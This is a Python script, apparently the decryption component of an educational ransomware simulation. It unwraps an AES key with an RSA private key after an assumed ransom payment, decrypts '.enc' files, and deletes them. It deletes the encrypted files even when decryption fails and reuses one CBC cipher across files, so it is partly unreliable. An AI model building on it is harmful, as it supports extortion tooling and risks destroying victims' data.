import glob
import os
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode
from base64 import b64decode

# Assuming the payment has been made
payment = True
if payment:
    print("\nPayment Successful and ransomkey.bin received\n\nDecrypting now....")

# Decrypting ransomkey.bin
file_in = open("ransomkey.bin", "rb")
private_key = RSA.import_key(open("ransomprvkey.pem").read())
enc_key = file_in.read(private_key.size_in_bytes())
cipher_rsa = PKCS1_OAEP.new(private_key)
dec_key = cipher_rsa.decrypt(enc_key)
# Getting the initialization vector
iv = file_in.read()
file_in.close()
key = b64encode(dec_key)

# Writing ransomkey.bin to .txt
file_out = open("ransomkey.txt", "wb")
file_out.write(key)
file_out.close()

# Reversing the order of encryption
iv = b64decode(iv)
keyD = b64decode(key)
cipherD = AES.new(keyD, AES.MODE_CBC, iv)

# Accessing the encrypted text
directory = os.getcwd()
os.chdir(directory + "/TextFiles")
for file in glob.glob("*.enc"):
    with open(file, 'rb') as cursor:
        encryptedMessage = cursor.read()
        cipherText = b64encode(encryptedMessage).decode('utf-8')
        # Writing the decrypted message back to .txt
        with open(file + ".txt", "wb") as fileOut:
            try:
                cipherTextD = b64decode(cipherText)
                pt = unpad(cipherD.decrypt(cipherTextD), AES.block_size)
                print(file + ".txt ")
                fileOut.write(pt)
            except ValueError:
                print("Incorrect decryption")
            except KeyError:
                print("Incorrect Key")
            fileOut.close()
        # Deleting the .enc files
        os.remove(file)
        cursor.close()

print("\nRecovery Complete!")
